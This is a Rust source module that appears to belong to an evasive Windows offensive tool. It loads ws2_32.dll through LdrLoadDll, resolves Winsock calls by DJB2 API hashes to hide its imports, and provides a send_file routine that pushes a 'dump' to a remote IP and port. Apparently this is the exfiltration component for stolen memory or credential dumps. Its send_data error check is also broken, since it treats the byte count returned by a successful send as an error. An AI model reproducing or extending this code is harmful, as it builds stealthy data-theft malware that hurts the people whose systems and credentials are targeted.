use core::{
    ffi::c_void,
    mem::{transmute, zeroed},
    ptr::{null, null_mut},
};

use alloc::{ffi::CString, vec::Vec};

use crate::{
    common::ldrapi::ldr_function, debug_println, instance::get_instance,
    native::ntdef::UnicodeString,
};

#[allow(non_camel_case_types)]
pub type SOCKET = usize;

// Data structures for Winsock
#[repr(C)]
pub struct WsaData {
    pub w_version: u16,
    pub w_high_version: u16,
    pub sz_description: [i8; 257],
    pub sz_system_status: [i8; 129],
    pub i_max_sockets: u16,
    pub i_max_udp_dg: u16,
    pub lp_vendor_info: *mut i8,
}

#[repr(C)]
pub struct SockAddrIn {
    pub sin_family: u16,
    pub sin_port: u16,
    pub sin_addr: InAddr,
    pub sin_zero: [i8; 8],
}

#[repr(C)]
pub struct InAddr {
    pub s_addr: u32,
}

#[repr(C)]
pub struct SockAddr {
    pub sa_family: u16,
    pub sa_data: [i8; 14],
}

#[repr(C)]
pub struct AddrInfo {
    pub ai_flags: i32,
    pub ai_family: i32,
    pub ai_socktype: i32,
    pub ai_protocol: i32,
    pub ai_addrlen: u32,
    pub ai_canonname: *mut i8,
    pub ai_addr: *mut SockAddr,
    pub ai_next: *mut AddrInfo,
}

#[allow(non_camel_case_types)]
#[repr(C)]
#[derive(Clone, Copy)]
pub struct FD_SET {
    pub fd_count: u32,
    pub fd_array: [SOCKET; 64],
}

#[allow(non_camel_case_types)]
#[repr(C)]
#[derive(Clone, Copy)]
pub struct TIMEVAL {
    pub tv_sec: i32,
    pub tv_usec: i32,
}

// Define function types for Winsock functions
type WSAStartupFunc =
    unsafe extern "system" fn(wVersionRequested: u16, lpWsaData: *mut WsaData) -> i32;
type WSACleanupFunc = unsafe extern "system" fn() -> i32;
type SocketFunc = unsafe extern "system" fn(af: i32, socket_type: i32, protocol: i32) -> SOCKET;
type ConnectFunc = unsafe extern "system" fn(s: SOCKET, name: *const SockAddr, namelen: i32) -> i32;
type SendFunc = unsafe extern "system" fn(s: SOCKET, buf: *const i8, len: i32, flags: i32) -> i32;
type RecvFunc = unsafe extern "system" fn(s: SOCKET, buf: *mut i8, len: i32, flags: i32) -> i32;
type ClosesocketFunc = unsafe extern "system" fn(s: SOCKET) -> i32;
type InetAddrFunc = unsafe extern "system" fn(cp: *const i8) -> u32;
type HtonsFunc = unsafe extern "system" fn(hostshort: u16) -> u16;
type GetAddrInfoFunc = unsafe extern "system" fn(
    node: *const i8,
    service: *const i8,
    hints: *const AddrInfo,
    res: *mut *mut AddrInfo,
) -> i32;
type FreeAddrInfoFunc = unsafe extern "system" fn(res: *mut AddrInfo);

type Ioctlsocket = unsafe extern "system" fn(s: SOCKET, cmd: i32, argp: *mut u32) -> i32;

type Select = unsafe extern "system" fn(
    nfds: i32,
    readfds: *mut FD_SET,
    writefds: *mut FD_SET,
    exceptfds: *mut FD_SET,
    timeout: *mut TIMEVAL,
) -> i32;

type WSAGetLastError = unsafe extern "system" fn() -> i32;

pub struct Winsock {
    pub wsa_startup: WSAStartupFunc,
    pub wsa_cleanup: WSACleanupFunc,
    pub socket: SocketFunc,
    pub connect: ConnectFunc,
    pub send: SendFunc,
    pub recv: RecvFunc,
    pub closesocket: ClosesocketFunc,
    pub inet_addr: InetAddrFunc,
    pub htons: HtonsFunc,
    pub getaddrinfo: GetAddrInfoFunc,
    pub freeaddrinfo: FreeAddrInfoFunc,
    pub ioctlsocket: Ioctlsocket,
    pub select: Select,
    pub wsa_get_last_error: WSAGetLastError,
}

impl Winsock {
    pub fn new() -> Self {
        Winsock {
            wsa_startup: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },
            wsa_cleanup: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },
            socket: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },
            connect: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },
            send: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },
            recv: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },
            closesocket: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },
            inet_addr: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },
            htons: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },
            getaddrinfo: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },
            freeaddrinfo: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },
            ioctlsocket: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },
            select: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },
            wsa_get_last_error: unsafe {
                core::mem::transmute(core::ptr::null::<core::ffi::c_void>())
            },
        }
    }
}

pub fn init_winsock_funcs() {
    unsafe {
        pub const WSA_STARTUP_DBJ2: usize = 0x142e89c3;
        pub const WSA_CLEANUP_DBJ2: usize = 0x32206eb8;
        pub const SOCKET_DBJ2: usize = 0xcf36c66e;
        pub const CONNECT_DBJ2: usize = 0xe73478ef;
        pub const SEND_DBJ2: usize = 0x7c8bc2cf;
        pub const RECV_DBJ2: usize = 0x7c8b3515;
        pub const CLOSESOCKET_DBJ2: usize = 0x185953a4;
        pub const INET_ADDR_DBJ2: usize = 0xafe73c2f;
        pub const HTONS_DBJ2: usize = 0xd454eb1;
        pub const GETADDRINFO_DBJ2: usize = 0x4b91706c;
        pub const FREEADDRINFO_DBJ2: usize = 0x307204e;
        pub const IOCTLSOCKET_H: usize = 0xd5e978a9;
        pub const SELECT_H: usize = 0xce86a705;
        pub const WSAGETLASTERROR_H: usize = 0x9c1d912e;

        let mut ws2_win32_dll_unicode = UnicodeString::new();
        let utf16_string: Vec<u16> = "ws2_32.dll".encode_utf16().chain(Some(0)).collect();
        ws2_win32_dll_unicode.init(utf16_string.as_ptr());

        let mut ws2_win32_handle: *mut c_void = null_mut();

        if let Some(instance) = get_instance() {
            (instance.ntdll.ldr_load_dll)(
                null_mut(),
                null_mut(),
                ws2_win32_dll_unicode,
                &mut ws2_win32_handle as *mut _ as *mut c_void,
            );

            if ws2_win32_handle.is_null() {
                return;
            }

            let ws2_32_module = ws2_win32_handle as *mut u8;

            let wsa_startup_addr = ldr_function(ws2_32_module, WSA_STARTUP_DBJ2);
            let wsa_cleanup_addr = ldr_function(ws2_32_module, WSA_CLEANUP_DBJ2);
            let socket_addr = ldr_function(ws2_32_module, SOCKET_DBJ2);
            let connect_addr = ldr_function(ws2_32_module, CONNECT_DBJ2);
            let send_addr = ldr_function(ws2_32_module, SEND_DBJ2);
            let recv_addr = ldr_function(ws2_32_module, RECV_DBJ2);
            let closesocket_addr = ldr_function(ws2_32_module, CLOSESOCKET_DBJ2);
            let inet_addr_addr = ldr_function(ws2_32_module, INET_ADDR_DBJ2);
            let htons_addr = ldr_function(ws2_32_module, HTONS_DBJ2);
            let getaddrinfo_addr = ldr_function(ws2_32_module, GETADDRINFO_DBJ2);
            let freeaddrinfo_addr = ldr_function(ws2_32_module, FREEADDRINFO_DBJ2);
            let ioctlsocket_addr = ldr_function(ws2_32_module, IOCTLSOCKET_H);
            let select_addr = ldr_function(ws2_32_module, SELECT_H);
            let wsa_get_last_error_addr = ldr_function(ws2_32_module, WSAGETLASTERROR_H);

            instance.winsock.wsa_startup = transmute(wsa_startup_addr);
            instance.winsock.wsa_cleanup = transmute(wsa_cleanup_addr);
            instance.winsock.socket = transmute(socket_addr);
            instance.winsock.connect = transmute(connect_addr);
            instance.winsock.send = transmute(send_addr);
            instance.winsock.recv = transmute(recv_addr);
            instance.winsock.closesocket = transmute(closesocket_addr);
            instance.winsock.inet_addr = transmute(inet_addr_addr);
            instance.winsock.htons = transmute(htons_addr);
            instance.winsock.getaddrinfo = transmute(getaddrinfo_addr);
            instance.winsock.freeaddrinfo = transmute(freeaddrinfo_addr);
            instance.winsock.ioctlsocket = transmute(ioctlsocket_addr);
            instance.winsock.select = transmute(select_addr);
            instance.winsock.wsa_get_last_error = transmute(wsa_get_last_error_addr);
        }
    }
}

/// Initializes the Winsock library for network operations on Windows.
/// Returns 0 on success, or the error code on failure.
pub fn init_winsock() -> i32 {
    unsafe {
        let mut wsa_data: WsaData = core::mem::zeroed();
        let result = (get_instance().unwrap().winsock.wsa_startup)(0x0202, &mut wsa_data);
        if result != 0 {
            return (get_instance().unwrap().winsock.wsa_get_last_error)();
        }
        result
    }
}

/// Cleans up the Winsock library.
///
/// This function cleans up the Winsock library, releasing any resources that were allocated.
/// This function does not return any values.
pub fn cleanup_winsock(sock: SOCKET) {
    unsafe {
        (get_instance().unwrap().winsock.closesocket)(sock);
        (get_instance().unwrap().winsock.wsa_cleanup)();
    }
}

/// Creates a new TCP socket for network communication.
/// Returns the socket descriptor (SOCKET) or an error code on failure.
pub fn create_socket() -> SOCKET {
    unsafe {
        (get_instance().unwrap().winsock.socket)(2, 1, 6) // AF_INET, SOCK_STREAM, IPPROTO_TCP
    }
}

/// Resolves a hostname to an IPv4 address.
/// Returns the IPv4 address as a `u32` or an error code on failure.
pub fn resolve_hostname(hostname: &str) -> u32 {
    unsafe {
        let hostname_cstr = CString::new(hostname).unwrap();
        let mut hints: AddrInfo = zeroed();
        hints.ai_family = 2; // AF_INET
        hints.ai_socktype = 1; // SOCK_STREAM
        let mut res: *mut AddrInfo = null_mut();

        let status = (get_instance().unwrap().winsock.getaddrinfo)(
            hostname_cstr.as_ptr(),
            null(),
            &hints,
            &mut res,
        );

        if status != 0 {
            return (get_instance().unwrap().winsock.wsa_get_last_error)() as u32;
        }

        let mut ip_addr: u32 = 0;
        let mut addr_info_ptr = res;

        while !addr_info_ptr.is_null() {
            let addr_info = &*addr_info_ptr;
            if addr_info.ai_family == 2 {
                // AF_INET
                let sockaddr_in = &*(addr_info.ai_addr as *const SockAddrIn);
                ip_addr = sockaddr_in.sin_addr.s_addr;
                break;
            }
            addr_info_ptr = addr_info.ai_next;
        }

        (get_instance().unwrap().winsock.freeaddrinfo)(res);
        ip_addr
    }
}

/// Connects a socket to a given address and port.
/// Returns 0 on success, or the error code on failure.
pub fn connect_socket(sock: SOCKET, addr: &str, port: u16) -> i32 {
    unsafe {
        let addr = if addr == "localhost" {
            "127.0.0.1"
        } else {
            addr
        };

        let resolve_addr = resolve_hostname(addr);
        let mut sockaddr_in: SockAddrIn = core::mem::zeroed();
        sockaddr_in.sin_family = 2; // AF_INET
        sockaddr_in.sin_port = (get_instance().unwrap().winsock.htons)(port);
        sockaddr_in.sin_addr.s_addr = resolve_addr;

        let sockaddr = &sockaddr_in as *const _ as *const SockAddr;
        let result = (get_instance().unwrap().winsock.connect)(
            sock,
            sockaddr,
            core::mem::size_of::<SockAddrIn>() as i32,
        );

        if result != 0 {
            return (get_instance().unwrap().winsock.wsa_get_last_error)();
        }
        result
    }
}

/// Sends data through a socket.
///
/// This function sends a specified byte array through the provided socket.
/// It returns an `i32`, where 0 indicates success, and any other value
/// represents the error code returned by `wsa_get_last_error`.
///
/// # Arguments
/// * `sock` - The socket descriptor.
/// * `data` - The data to be sent.
///
/// # Returns
/// * `i32` - 0 on success, or the error code on failure.
pub fn send_data(sock: SOCKET, data: &[u8]) -> i32 {
    unsafe {
        let result = (get_instance().unwrap().winsock.send)(
            sock,
            data.as_ptr() as *const i8,
            data.len() as i32,
            0,
        );
        if result != 0 {
            return (get_instance().unwrap().winsock.wsa_get_last_error)();
        }
        result
    }
}

/// Sends a Vec<u8> to a remote address and port via socket.
///
/// # Arguments
/// * `data` - The data to be sent as a Vec<u8>.
/// * `ip` - The remote IP address as a string (e.g., "127.0.0.1").
/// * `port` - The port to connect to.
pub fn send_file(data: Vec<u8>, ip: &str, port: u16) {
    // Initialize Winsock.
    let wsa_init_result = init_winsock();
    if wsa_init_result != 0 {
        debug_println!(
            "[-] Failed to initialize Winsock with error: ",
            wsa_init_result as usize,
            false
        );
        return;
    }

    // Create a socket.
    let sock = create_socket();
    if sock == usize::MAX {
        debug_println!(
            "[-] Failed to create socket with error: ",
            unsafe { (get_instance().unwrap().winsock.wsa_get_last_error)() as usize },
            false
        );
        return;
    }

    // Connect the socket to the IP and port.
    let connect_result = connect_socket(sock, ip, port);
    if connect_result != 0 {
        debug_println!(
            "[-] Failed to connect socket with error: ",
            connect_result as usize,
            false
        );
        cleanup_winsock(sock);
        return;
    }

    // Send the data.
    let send_result = send_data(sock, &data);

    // Check if sending the file was successful.
    if send_result != 0 {
        debug_println!(
            "[-] Failed to send data to remote host with error code: ",
            send_result as usize,
            false
        );
        cleanup_winsock(sock);
        return;
    }

    // Close the socket.
    cleanup_winsock(sock);

    debug_println!("[+] Dump sent successfully to remote host!");
}
